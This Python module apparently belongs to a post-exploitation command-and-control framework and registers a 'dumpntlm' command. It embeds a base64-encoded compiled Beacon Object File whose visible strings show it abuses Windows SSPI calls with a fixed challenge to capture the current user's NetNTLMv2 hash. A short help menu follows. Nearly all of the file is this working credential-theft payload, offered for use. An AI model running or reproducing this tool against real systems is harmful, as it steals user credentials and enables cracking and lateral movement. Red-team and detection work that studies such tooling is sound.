import base64
from typing import List

# BOF imports
from core.gunnershell.bofs.base import Bof, register

# Session Management
from core.session_handlers import session_manager

from colorama import Style, Fore
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
reset = Style.RESET_ALL

@register("dumpntlm")
class DumlNTLMBof(Bof):
	base64bof: str = "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AAADAAAAAABlAgAAIAAAAAUAAAADAAAAAACJAgAAMAAAAAYAAAADAAAAAACsAgAALAAAAAUAAAADAAAAAAC3AgAAPAAAAAYAAAADACRTRzc3NjI1GAAAAAMAAAADACRTRzc3NjI2GQAAAAMAAAADAC5kYXRhAAAAAAAAAAcAAAADAbIAAAAAAAAAqpHWJgAAAAAAACRTRzc3NjI3AAAAAAcAAAADACRTRzc3NjMzCAAAAAcAAAADACRTRzc3NjM0MAAAAAcAAAADACRTRzc3NjM1YAAAAAcAAAADACRTRzc3NjM2bAAAAAcAAAADACRTRzc3NjM3dAAAAAcAAAADACRTRzc3NjM4eAAAAAcAAAADACRTRzc3NjM5gAAAAAcAAAADACRTRzc3NjQwhAAAAAcAAAADACRTRzc3NjQxjAAAAAcAAAADACRTRzc3NjQ4kAAAAAcAAAADAC5jaGtzNjQAAAAAAAgAAAADAUAAAAAAAAAAAAAAAAAAAAAAAMECAABjdXJyZW50b3V0c2l6ZQBfX2ltcF9TRUNVUjMyJEFjY2VwdFNlY3VyaXR5Q29udGV4dABfX2ltcF9TRUNVUjMyJEFjcXVpcmVDcmVkZW50aWFsc0hhbmRsZUEAX19pbXBfU0VDVVIzMiRJbml0aWFsaXplU2VjdXJpdHlDb250ZXh0QQBfX2ltcF9NU1ZDUlQkY2FsbG9jAF9faW1wX01TVkNSVCR2c25wcmludGYAX19pbXBfTVNWQ1JUJG1lbXNldABfX2ltcF9NU1ZDUlQkbWVtY3B5AF9faW1wX0tFUk5FTDMyJEdldFByb2Nlc3NIZWFwAF9faW1wX0tFUk5FTDMyJEhlYXBBbGxvYwBfX2ltcF9NU1ZDUlQkZnJlZQBfX2ltcF9LRVJORUwzMiRIZWFwRnJlZQBfX2ltcF9CZWFjb25PdXRwdXQAX19pbXBfQmVhY29uUHJpbnRmAGludGVybmFsX3ByaW50ZgBwcmludG91dHB1dABTZXRQcmVkZWZpbmVkQ2hhbGxlbmdlAEdldE5UTE1DaGFsbGVuZ2VBbmRSZXNwb25zZQAkdW53aW5kJGJvZnN0YXJ0ACRwZGF0YSRib2ZzdGFydAAkdW53aW5kJGludGVybmFsX3ByaW50ZgAkcGRhdGEkaW50ZXJuYWxfcHJpbnRmACR1bndpbmQkcHJpbnRvdXRwdXQAJHBkYXRhJHByaW50b3V0cHV0ACR1bndpbmQkU2V0UHJlZGVmaW5lZENoYWxsZW5nZQAkcGRhdGEkU2V0UHJlZGVmaW5lZENoYWxsZW5nZQAkdW53aW5kJEdldE5UTE1DaGFsbGVuZ2VBbmRSZXNwb25zZQAkcGRhdGEkR2V0TlRMTUNoYWxsZW5nZUFuZFJlc3BvbnNlACR1bndpbmQkZ28AJHBkYXRhJGdvAA=="

	def help_menu():
		menu = """
Capture the NetNTLMv2 hash of the current user
Usage: bofexec dumpntlm
"""
		print(brightgreen + menu + reset)
		return